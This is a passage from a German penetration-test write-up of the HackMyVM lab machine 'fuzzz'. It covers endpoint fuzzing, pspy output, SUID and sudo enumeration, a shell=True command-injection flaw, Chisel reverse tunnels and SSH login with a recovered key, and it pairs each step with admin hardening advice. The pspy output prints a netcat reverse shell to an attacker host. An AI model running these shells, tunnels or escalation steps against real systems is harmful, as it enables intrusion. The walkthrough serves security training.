+&gt; Host: 127.0.0.1:8080
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; <span class="command">Content-Type: text/html; charset=utf-8</span>
+Content-Type: text/html; charset=utf-8
+&lt; <span class="command">Content-Length: 0</span>
+Content-Length: 0
+&lt; 
+
+* <span class="password">Connection #0 to host 127.0.0.1 left intact</span>
+</pre></div>
+            </div>
+         <p class="analysis">
+            <strong>Analyse:</strong> Basierend auf der Beobachtung, dass Endpunkte wie &#x27;/line1&#x27; und &#x27;/line5&#x27; existieren (200 OK) und Endpunkte wie &#x27;/line6&#x27; nicht (404 Not Found), erstellte ich ein einfaches Bash-Skript, um automatisch nach weiteren &#x27;/lineX&#x27; Endpunkten zu suchen. Das Skript iteriert &uuml;ber Zahlen von 0 bis 20 (<code>for i in {0..20}</code>) und testet jeweils die URL <code>http://127.0.0.1:8080/line$i</code> mit <code>curl -s -o /dev/null -w &quot;%{http_code}&quot;</code>. Dieser curl-Befehl im &quot;silent&quot; Modus (<code>-s</code>) verwirft die Ausgabe (<code>-o /dev/null</code>) und schreibt nur den HTTP-Statuscode (<code>-w &quot;%{http_code}&quot;</code>) auf die Standardausgabe. Wenn der zur&uuml;ckgegebene Statuscode 200 ist (<code>if [ &quot;$STATUS&quot; -eq 200 ]</code>), meldet das Skript einen Treffer. Andernfalls gibt es nur einen Punkt aus, um den Fortschritt anzuzeigen. Die Ausf&uuml;hrung des Skripts &#x27;./line_fuzz.sh&#x27; identifizierte die Endpunkte &#x27;/line1&#x27;, &#x27;/line2&#x27;, &#x27;/line3&#x27;, &#x27;/line4&#x27; und &#x27;/line5&#x27; mit Status 200.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Dieses einfache Skript war sehr effektiv, um die existierenden &#x27;/lineX&#x27; Endpunkte zu finden. Die Methode, den Statuscode als Orakel f&uuml;r die Existenz eines Pfades zu verwenden, funktionierte hier perfekt. Das zeigt die St&auml;rke von Automatisierung und gezieltem Fuzzing, sobald das Verhalten der Anwendung verstanden wurde. Das Skript identifizierte f&uuml;nf relevante Endpunkte, die nun weiter untersucht werden k&ouml;nnen.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Automatisiere repetitive Tests, wie das Fuzzing von nummerierten oder sequenziellen Pfaden. Erstelle einfache Skripte, die das Verhalten der Anwendung nutzen, um versteckte Ressourcen zu entdecken. Das Parsen von Statuscodes oder Antwortgr&ouml;&szlig;en ist eine g&auml;ngige Technik.
+            <br><strong>Empfehlung (Admin):</strong> Implementiere Schutzmechanismen gegen sequenzielles Fuzzing oder Brute-Force-Angriffe auf URLs. Dies kann durch Ratenbegrenzung, WAFs (Web Application Firewalls) oder die &Uuml;berwachung ungew&ouml;hnlicher Zugriffsmuster in den Logs erfolgen. Vermeide leicht vorhersehbare URL-Strukturen, wenn sensible Ressourcen gesch&uuml;tzt werden sollen.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">#!/bin/bash</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">echo &quot;Starte Suche nach /lineX Endpunkten...&quot;</span>
+                    </div>
+                 </div>
+                 <div class="terminal"><pre>
+Starte Suche nach /lineX Endpunkten...
+</pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">for i in {0..20}; do</span>
+                     </div>
+                </div>
+                 <div class="terminal"><pre>
+<span class="command">  URL=&quot;http://127.0.0.1:8080/line$i&quot;</span>
+
+<span class="command">  STATUS=$(curl -s -o /dev/null -w &quot;%{http_code}&quot; &quot;$URL&quot;)</span>
+
+<span class="command">  if [ &quot;$STATUS&quot; -eq 200 ]; then</span>
+<span class="command">    echo -e &quot;\n✅ TREFFER! Endpunkt gefunden: $URL (Status: $STATUS)&quot;</span>
+<span class="command">  else</span>
+<span class="command">    echo -n &quot;.&quot;</span>
+<span class="command">  fi</span>
+<span class="command">done</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">echo -e &quot;\nSuche beendet.&quot;</span>
+                    </div>
+                 </div>
+                 <div class="terminal"><pre>
+.
+<span class="password">✅ TREFFER! Endpunkt gefunden: http://127.0.0.1:8080/line1 (Status: 200)</span>
+
+<span class="password">✅ TREFFER! Endpunkt gefunden: http://127.0.0.1:8080/line2 (Status: 200)</span>
+
+<span class="password">✅ TREFFER! Endpunkt gefunden: http://127.0.0.1:8080/line3 (Status: 200)</span>
+
+<span class="password">✅ TREFFER! Endpunkt gefunden: http://127.0.0.1:8080/line4 (Status: 200)</span>
+
+<span class="password">✅ TREFFER! Endpunkt gefunden: http://127.0.0.1:8080/line5 (Status: 200)</span>
+...............
+Suche beendet.
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um die laufenden Prozesse aus der Perspektive des &#x27;runner&#x27; Benutzers zu &uuml;berwachen und potenzielle Cronjobs oder andere interessante Prozesse zu identifizieren, lud ich das statisch kompilierte Binary <code>pspy64</code> auf das Zielsystem hoch (wahrscheinlich wieder &uuml;ber HTTP mit wget, &auml;hnlich wie bei Chisel) und f&uuml;hrte es aus. <code>pspy</code> ist ein &Uuml;berwachungstool, das Prozessaktivit&auml;ten ohne Root-Rechte beobachten kann, indem es auf Ver&auml;nderungen im procfs Dateisystem achtet. Die Ausgabe von <code>./pspy64</code> listet Prozesse auf, die zu bestimmten Zeitpunkten aktiv waren. Es zeigte verschiedene Systemprozesse (sshd, crond, ntpd, syslogd etc.) sowie Prozesse, die ich zuvor gesehen hatte (uwsgi als Benutzer asahi, meine eigene Shell-Verbindung mit cat, sh und nc, sowie pspy64 selbst). Besonders interessant ist der Eintrag <code>UID=1000 PID=2525 | /usr/bin/python3 /sbin/sadbdot</code>, der zeigt, dass das Skript <code>/sbin/sadbdot</code> als Benutzer &#x27;runner&#x27; ausgef&uuml;hrt wird. Dies korreliert mit den Umgebungsvariablen, die ich zuvor gefunden hatte und die auf einen &#x27;sadbdot&#x27; Dienst hinwiesen. Die Untersuchung dieses Skripts ist nun ein potenzieller Weg zur weiteren Aufkl&auml;rung oder Privilegieneskalation als Benutzer &#x27;runner&#x27;.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> <code>pspy</code> ist ein exzellentes Tool f&uuml;r die Linux-Privilegieneskalation, da es Cronjobs und andere periodisch oder vom System getriggerte Prozesse aufdecken kann, die mit bestimmten Rechten laufen. Die Entdeckung des <code>/sbin/sadbdot</code> Skripts, das unter meinem aktuellen Benutzer &#x27;runner&#x27; l&auml;uft, ist ein vielversprechender Fund. Ich muss nun den Inhalt dieses Skripts untersuchen, um herauszufinden, was es tut und ob es Schwachstellen aufweist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Tools wie pspy, linenum.sh oder PEASS, um Systeminformationen und potenzielle Privilegieneskalationsvektoren zu sammeln. &Uuml;berwache laufende Prozesse und Skripte, insbesondere solche, die mit h&ouml;heren Privilegien laufen oder periodisch ausgef&uuml;hrt werden.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache die Ausf&uuml;hrung von unerwarteten Bin&auml;rdateien oder Skripten (z.B. in /tmp). Implementiere Application Whitelisting. &Uuml;berpr&uuml;fe regelm&auml;&szlig;ig Cronjobs und andere geplante Aufgaben auf deren Notwendigkeit und die Rechte, unter denen sie ausgef&uuml;hrt werden. Implementiere strenge Berechtigungen f&uuml;r Skripte und Programme in Systemverzeichnissen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+/tmp $ <span class="command">./pspy64</span> 
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=3103   | ./pspy64</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=31     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=30     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=3      |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=28     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=2784   | /bin/sh</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=2783   | python3 -c import pty;pty.spawn(&quot;/bin/sh&quot;)</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=2776   | nc 192.168.2.199 4445</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=2775   | /bin/sh -i</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=2774   | cat /tmp/f</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=27     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=26     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1001 PID=2585   | /usr/sbin/uwsgi --plugin python3 --http-socket 127.0.0.1:80 --wsgi-file /opt/webapp/app.py --callable app</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=2560   | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=1000 PID=2525   | /usr/bin/python3 /sbin/sadbdot</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=123  PID=2500   | /usr/sbin/ntpd -N -p pool.ntp.org -n</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=25     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=2475   | /usr/sbin/crond -c /etc/crontabs -f</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=2450   | /sbin/acpid -f</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=2424   | /sbin/syslogd -t -n</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=24     |</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=2331   | /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:fuzzz.hmv</span> 
+<span class="password">2025/07/02 06:06:53 CMD: UID=0    PID=23     |</span> 
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Um mehr &uuml;ber die auf dem System verf&uuml;gbaren BusyBox-Funktionen zu erfahren, habe ich den Befehl <code>busybox --list-full</code> ausgef&uuml;hrt. Dieser Befehl listet alle Applets oder Befehle auf, die in dieser spezifischen BusyBox-Kompilierung enthalten sind. Die Ausgabe ist in der Regel sehr lang und enth&auml;lt eine Liste aller verf&uuml;gbaren vereinfachten Versionen von Standard-Unix-Befehlen. Dies hilft mir zu verstehen, welche grundlegenden Operationen auf dem System direkt mit BusyBox m&ouml;glich sind.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Das Erlangen der vollst&auml;ndigen Liste der BusyBox-Applets ist wertvoll f&uuml;r die Systemaufkl&auml;rung auf eingebetteten Systemen oder minimalistischen Linux-Distributionen wie Alpine Linux. Es erm&ouml;glicht mir zu sehen, welche Tools zur Verf&uuml;gung stehen, um Aufgaben auszuf&uuml;hren, ohne zus&auml;tzliche Bin&auml;rdateien hochladen zu m&uuml;ssen. Das Wissen &uuml;ber verf&uuml;gbare Tools wie <code>nc</code>, <code>wget</code>, <code>find</code> etc. ist entscheidend f&uuml;r die Planung weiterer Schritte.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> F&uuml;hre immer <code>busybox --list-full</code> oder &auml;hnliche Befehle aus, wenn du auf einem BusyBox-System bist, um die verf&uuml;gbaren Tools zu identifizieren. Lerne die spezifischen Optionen und das Verhalten der BusyBox-Applets.
+            <br><strong>Empfehlung (Admin):</strong> Wenn du BusyBox verwendest, kompiliere nur die absolut notwendigen Applets in das Binary, um die Angriffsfl&auml;che zu minimieren. Dokumentiere die enthaltenen Applets.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+/tmp $ <span class="command">busybox --list-full</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+usr/bin/[
+usr/bin/[[
+sbin/acpid
+usr/sbin/add-shell
+usr/sbin/addgroup
+usr/sbin/adduser
+sbin/adjtimex
+bin/arch
+sbin/arp
+usr/sbin/arping
+bin/ash
+usr/bin/awk
+bin/base64
+...
+..
+.
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Bei der Suche nach m&ouml;glichen Privilegieneskalationsvektoren habe ich das Dateisystem nach Bin&auml;rdateien mit gesetztem SUID-Bit durchsucht (<code>find / -perm /4000 2&gt;/dev/null</code> ist der Standardbefehl, hier wurde wahrscheinlich eine Variante davon verwendet, oder die Suche konzentrierte sich auf <code>/bin</code>, da ich mich im &#x27;runner&#x27;-Kontext befinde). Das SUID-Bit erlaubt einem Benutzer, ein Programm mit den Rechten des Dateibesitzers auszuf&uuml;hren, unabh&auml;ngig davon, wer das Programm startet. Der Befehl <code>find /bin | grep bbsuid</code> suchte explizit nach einer Datei namens &#x27;bbsuid&#x27; im /bin-Verzeichnis und fand &#x27;/bin/bbsuid&#x27;. Die anschlie&szlig;ende &Uuml;berpr&uuml;fung der Dateiberechtigungen mit <code>ls -la /bin/bbsuid</code> zeigte, dass &#x27;/bin/bbsuid&#x27; dem Benutzer &#x27;root&#x27; geh&ouml;rt und das SUID-Bit f&uuml;r den Besitzer gesetzt ist (erkennbar am &#x27;s&#x27; in der Ausgabe: <code>---s--x--x 1 root root ... /bin/bbsuid</code>).
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Bin&auml;rdateien mit SUID-Bit sind prim&auml;re Ziele f&uuml;r die Privilegieneskalation. Da <code>/bin/bbsuid</code> Root geh&ouml;rt und SUID gesetzt hat, bedeutet dies, dass jeder Benutzer (einschlie&szlig;lich &#x27;runner&#x27;) dieses Programm mit Root-Rechten ausf&uuml;hren kann. Ich muss untersuchen, was &#x27;bbsuid&#x27; tut und ob es M&ouml;glichkeiten gibt, es zu missbrauchen (z.B. zur Ausf&uuml;hrung beliebiger Befehle oder zum Lesen/Schreiben gesch&uuml;tzter Dateien) oder ob es einfach eine SUID-Wrapper f&uuml;r bestimmte BusyBox-Funktionen ist. Der Name &#x27;bbsuid&#x27; deutet auf eine Verbindung zu BusyBox hin. Sp&auml;tere Tests zeigten, dass der Versuch, es f&uuml;r eine Root-Shell zu nutzen, nicht direkt funktionierte, wenn der Benutzername &#x27;runner&#x27; beteiligt war.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Suche immer nach SUID/SGID-Bin&auml;rdateien auf dem System. Pr&uuml;fe bekannte SUID-Exploits (z.B. auf GTFOBins). Versuche, die Funktionalit&auml;t der SUID-Binaries zu verstehen und ob sie zur Ausf&uuml;hrung von Befehlen, zur Dateimanipulation oder zum Spawnen einer Root-Shell missbraucht werden k&ouml;nnen.
+            <br><strong>Empfehlung (Admin):</strong> Minimiere die Anzahl der SUID/SGID-Bin&auml;rdateien auf dem System. Entferne das SUID-Bit von allen Programmen, bei denen es nicht unbedingt erforderlich ist. Pr&uuml;fe bekannte Schwachstellen in verbleibenden SUID-Programmen. Implementiere ein FIM-System, das das Vorhandensein von SUID-Dateien &uuml;berwacht.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+ /tmp $ <span class="command">find /bin | grep bbsuid</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">/bin/bbsuid</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+/tmp $ <span class="command">cat /sbin/sadbdot</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+....
+..
+else: <span class="command"># One-shot command (any OS) - this part is working well</span>
+                    cmd_to_exec_str_or_list = self.command_str
+                    <span class="command">use_shell_true_for_popen = True  # &lt;--- BINGO!</span>
+                    print(f&quot;[{self.conn_desc}-{self.server_stream_id}] Starting Popen-based one-shot command: &#x27;{cmd_to_exec_str_or_list}&#x27;&quot;)
+
+                self.process = subprocess.Popen(cmd_to_exec_str_or_list,
+                                                <span class="command"># ...</span>
+                                                <span class="password">shell=use_shell_true_for_popen</span>, <span class="command"># &lt;--- Das ist eine Schwachstelle</span> 
+....
+..
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Ich habe das Skript <code>/sbin/sadbdot</code>, das laut pspy unter dem Benutzer &#x27;runner&#x27; l&auml;uft, untersucht. Es handelt sich um ein Python 3-Skript. Die hier gezeigten Ausz&uuml;ge aus dem Code sind &auml;u&szlig;erst aufschlussreich f&uuml;r die Privilegieneskalation. Die Zeilen <code>use_shell_true_for_popen = True</code> und <code>shell=use_shell_true_for_popen</code> in der <code>subprocess.Popen</code>-Funktion sind ein klares Indiz f&uuml;r eine Befehlsinjektionsschwachstelle. Wenn <code>shell=True</code> in <code>subprocess.Popen</code> verwendet wird, interpretiert Python den &uuml;bergebenen Befehl als Shell-Befehl, der &uuml;ber eine Zwischen-Shell ausgef&uuml;hrt wird (z.B. <code>/bin/sh -c &quot;dein_befehl&quot;</code>). Dies &ouml;ffnet die T&uuml;r f&uuml;r Befehlsinjektion, wenn Teile des Befehls von externen Eingaben gesteuert werden, ohne korrekt saniert zu werden. Das Skript scheint einen &quot;One-shot command&quot; zu verarbeiten.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Wow, das ist eine offensichtliche und kritische Schwachstelle! Die Nutzung von <code>shell=True</code> in <code>subprocess.Popen</code> ist eine bekannte unsichere Praxis, wenn die Eingabe nicht vollst&auml;ndig vertrauensw&uuml;rdig ist. Dies bedeutet, dass, wenn ich irgendwie kontrollieren kann, was als <code>self.command_str</code> an dieses Python-Skript &uuml;bergeben wird, ich beliebige Shell-Befehle als der Benutzer ausf&uuml;hren kann, unter dem dieses Skript l&auml;uft (was laut pspy &#x27;runner&#x27; ist). Dies ist ein direkter Weg zur Befehlsausf&uuml;hrung als &#x27;runner&#x27;, was meine bestehende Shell-Sitzung verst&auml;rkt und vielleicht neue M&ouml;glichkeiten er&ouml;ffnet, auch wenn ich bereits als &#x27;runner&#x27; eine Shell habe. Es k&ouml;nnte eine stabilere Shell bieten oder auf andere Weise nutzbar sein.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Suche nach Code, der externe Eingaben verarbeitet und Systembefehle mit <code>shell=True</code> oder &auml;hnlichen Funktionen (z.B. <code>system()</code>, <code>exec()</code> in anderen Sprachen) ausf&uuml;hrt. Teste auf Befehlsinjektion, indem du Shell-Metazeichen (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>||</code>, `$()`, ` ` etc.) in der Eingabe verwendest.
+            <br><strong>Empfehlung (Admin):</strong> &Uuml;berpr&uuml;fe den Quellcode von Anwendungen, die externe Eingaben verarbeiten und Systembefehle ausf&uuml;hren. Vermeide die Verwendung von <code>shell=True</code> in <code>subprocess.Popen</code> oder &auml;hnliche unsichere Praktiken. Wenn Befehle ausgef&uuml;hrt werden m&uuml;ssen, nutze sicherere APIs, die das Kommando und seine Argumente als Liste &uuml;bergeben, oder saniere die Eingabe streng, um Shell-Metazeichen zu entfernen oder zu maskieren. Implementiere Code-Reviews und statische Code-Analyse-Tools, um solche Schwachstellen zu erkennen.
+        </p>
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Hier die Privilege Escalation-Schritte einfügen -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Um den eben rekonstruierten SSH-Private Key f&uuml;r den Benutzer &#x27;asahi&#x27; nutzen zu k&ouml;nnen, musste ich eine SSH-Verbindung zum Zielsystem herstellen. Da der SSH-Dienst auf Port 22 extern erreichbar war (laut Nmap), k&ouml;nnte ich theoretisch eine direkte Verbindung versuchen. Allerdings habe ich bereits festgestellt, dass ein Chisel-Tunnel f&uuml;r den lokalen Webserver ben&ouml;tigt wurde. Es ist eine gute Praxis, konsistent Tunneling zu verwenden, wenn man einmal damit begonnen hat, um Netzwerk-Fluss zu kontrollieren und zu dokumentieren. Daher habe ich entschieden, einen weiteren Chisel-Reverse-Tunnel einzurichten, diesmal von Port 22 des Zielsystems zu einem lokalen Port auf meinem Kali-Rechner (z.B. 2222). Der Befehl <code>./chisel server -p 9001 --reverse</code> startet den Chisel-Server auf Kali auf Port 9001 (dieser Server lief m&ouml;glicherweise bereits, wurde hier aber sicherheitshalber erneut gezeigt). Der Befehl <code>./chisel client 192.168.2.199:9001 R:2222:127.0.0.1:22</code> auf dem Zielsystem stellt die Verbindung zum Kali-Server her und erstellt den Reverse Tunnel, der lokalen Traffic auf Kali:2222 zum Ziel:127.0.0.1:22 umleitet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Einrichtung eines dedizierten Tunnels f&uuml;r SSH ist eine saubere Methode, um den Zugriff zu organisieren und zu demonstrieren, wie selbst Dienste, die extern erreichbar sind, &uuml;ber interne Routen angesprochen werden k&ouml;nnen (hier zwar unn&ouml;tig komplex, aber als konsistente Tunneling-Methode dokumentiert). Der Tunnel wird erfolgreich aufgebaut, was durch die Chisel-Ausgaben best&auml;tigt wird. Ich kann nun versuchen, &uuml;ber localhost:2222 auf meinem Kali-System eine SSH-Verbindung zum Ziel auf Port 22 als Benutzer &#x27;asahi&#x27; mit dem rekonstruierten Schl&uuml;ssel herzustellen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beherrsche Tunneling-Techniken (Chisel, SSH, Metasploit-Proxys etc.), um Netzwerkbeschr&auml;nkungen zu &uuml;berwinden und interne Dienste zu erreichen. Nutze Reverse Tunnel (<code>R:</code> in Chisel), um Dienste auf dem Zielsystem von deinem Angreifer-System aus zug&auml;nglich zu machen.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berwache das Starten von Netzwerk-Tools wie Chisel auf Systemen und den Aufbau von Tunneln. Implementiere Netzwerksegmentierung und Firewall-Regeln, die laterale Bewegungen und Tunneling erschweren.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">./chisel server -p 9001 --reverse</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">2025/07/03 23:29:16 server: Reverse tunnelling enabled</span>
+<span class="password">2025/07/03 23:29:16 server: Fingerprint ti3baoxS/6g/TVdb1GXHGBXCytyEUIJLeu5/oGrsCUk=</span>
+<span class="password">2025/07/03 23:29:16 server: Listening on http://0.0.0.0:9001</span>
+<span class="password">2025/07/03 23:29:35 server: session#1: tun: proxy#R:2222=&gt;22: Listening</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+/tmp $ <span class="command">./chisel client 192.168.2.199:9001 R:2222:127.0.0.1:22</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">2025/07/04 05:29:32 client: Connecting to ws://192.168.2.199:9001</span>
+<span class="password">2025/07/04 05:29:36 client: Connected (Latency 380.065&micro;s)</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit dem vorbereiteten Private Key &#x27;idasahi&#x27; und dem etablierten Chisel-SSH-Tunnel habe ich versucht, mich als Benutzer &#x27;asahi&#x27; auf dem Zielsystem anzumelden. Ich nutzte den Befehl <code>ssh asahi@fuzzz.hmv -i idasahi</code>, der SSH anweist, die Identit&auml;tsdatei &#x27;idasahi&#x27; f&uuml;r die Authentifizierung zu verwenden. Die Verbindung wurde &uuml;ber den Chisel-Tunnel zu Port 22 des Ziels hergestellt (das fuzzz.hmv im Befehl wird lokal &uuml;ber /etc/hosts aufgel&ouml;st, der Tunnel leitet dann an 127.0.0.1:22 auf dem Ziel weiter). Nach erfolgreicher Authentifizierung mit dem Schl&uuml;ssel erhielt ich eine Shell, erkennbar am Prompt &#x27;fuzzz:~$&#x27;. Ich best&auml;tigte meine Identit&auml;t sofort mit dem <code>id</code> Befehl, der zeigte: <code>uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)</code>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch, der SSH-Login mit dem extrahierten Schl&uuml;ssel als Benutzer &#x27;asahi&#x27; war erfolgreich! Dies best&auml;tigt, dass der durch Fuzzing gefundene base64-kodierte String tats&auml;chlich der Private Key f&uuml;r diesen Benutzer war. Ich habe nun eine stabile Shell als Benutzer &#x27;asahi&#x27;, der h&ouml;here Privilegien hat als der vorherige &#x27;runner&#x27; (UID 1001 vs 1000) und potenziell andere Berechtigungen im Dateisystem und bei der Befehlsausf&uuml;hrung. Die Suche nach Privilegieneskalation kann nun aus dieser neuen Perspektive fortgesetzt werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze gefundene Schl&uuml;ssel oder Zugangsdaten sofort, um dich auf dem Zielsystem anzumelden. Best&auml;tige immer deine Identit&auml;t und Rechte nach einem erfolgreichen Login.
+                <br><strong>Empfehlung (Admin):</strong> Pr&uuml;fe regelm&auml;&szlig;ig, ob private SSH-Schl&uuml;ssel kompromittiert wurden (z.B. durch Suchen in &ouml;ffentlichen Datenbanken oder die &Uuml;berwachung ungew&ouml;hnlicher Logins). Erzwinge die Nutzung passwortgesch&uuml;tzter SSH-Schl&uuml;ssel, auch wenn dies hier nicht der Fall war (der Schl&uuml;ssel war ungesch&uuml;tzt). Implementiere Multi-Faktor-Authentifizierung f&uuml;r SSH, wo immer m&ouml;glich.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">ssh asahi@fuzzz.hmv -i idasahi</span>        
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">fuzzz:~$ id</span>
+<span class="command">uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)</span>
+<span class="command">fuzzz:~$ </span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer &#x27;asahi&#x27; war mein n&auml;chster Schritt, die mir &uuml;ber <code>sudo</code> gew&auml;hrten Berechtigungen zu &uuml;berpr&uuml;fen. Der Befehl <code>sudo -l</code> listet alle Befehle auf, die der aktuelle Benutzer (in diesem Fall &#x27;asahi&#x27;) mit <code>sudo</code> ausf&uuml;hren darf, und ob daf&uuml;r ein Passwort ben&ouml;tigt wird. Die Ausgabe zeigte eine Konfiguration mit <code>NOPASSWD: /usr/local/bin/lrz</code>. Dies ist ein sehr wichtiger Fund: Der Benutzer &#x27;asahi&#x27; darf das Programm <code>/usr/local/bin/lrz</code> mit <code>sudo</code> ausf&uuml;hren, ohne das eigene Passwort eingeben zu m&uuml;ssen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die M&ouml;glichkeit, <code>/usr/local/bin/lrz</code> ohne Passwort als Root auszuf&uuml;hren, ist eine kritische Schwachstelle f&uuml;r die Privilegieneskalation. Programme, die mit Root-Rechten ausgef&uuml;hrt werden d&uuml;rfen, k&ouml;nnen oft missbraucht werden, um beliebigen Code auszuf&uuml;hren oder Systemdateien zu manipulieren. <code>lrz</code> ist Teil des lrzsz-Pakets, das f&uuml;r Datei&uuml;bertragungen &uuml;ber serielle Verbindungen oder TCP-Sockets verwendet wird. Die dokumentierte Nutzung mit <code>--tcp-server</code> deutet darauf hin, dass es sich um eine Netzwerkfunktion handelt, die potenziell zur Datei&uuml;bertragung mit Root-Rechten missbraucht werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe immer <code>sudo -l</code>, um Privilegieneskalationsm&ouml;glichkeiten &uuml;ber sudo zu finden. Recherchiere die Bin&auml;rdateien, die mit NOPASSWD oder anderen erweiterten Rechten ausgef&uuml;hrt werden d&uuml;rfen (z.B. auf GTFOBins). Suche nach Wegen, wie diese Bin&auml;rdateien zur Ausf&uuml;hrung von Systembefehlen, zum Lesen/Schreiben von Dateien oder zum Erlangen einer Root-Shell missbraucht werden k&ouml;nnen.
+                <br><strong>Empfehlung (Admin):</strong> Vermeide die Konfiguration von <code>NOPASSWD</code> in der sudoers-Datei, es sei denn, dies ist absolut unumg&auml;nglich und der zugelassene Befehl ist sorgf&auml;ltig gepr&uuml;ft und parameterbeschr&auml;nkt. &Uuml;berpr&uuml;fe die Bin&auml;rdateien, die &uuml;ber sudo ausgef&uuml;hrt werden d&uuml;rfen, auf m&ouml;gliche Missbrauchsszenarien (z.B. durch SUID/SGID-Bits oder spezielle Funktionen wie Dateizugriff oder Befehlsausf&uuml;hrung). Entferne das lrzsz-Paket, wenn es nicht ben&ouml;tigt wird, oder beschr&auml;nke dessen Ausf&uuml;hrungsm&ouml;glichkeiten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">ssh asahi@fuzzz.hmv -i fuzzz/idasahi</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="command">fuzzz:~$ sudo -l</span>
+<span class="command">Matching Defaults entries for asahi on fuzzz:</span>
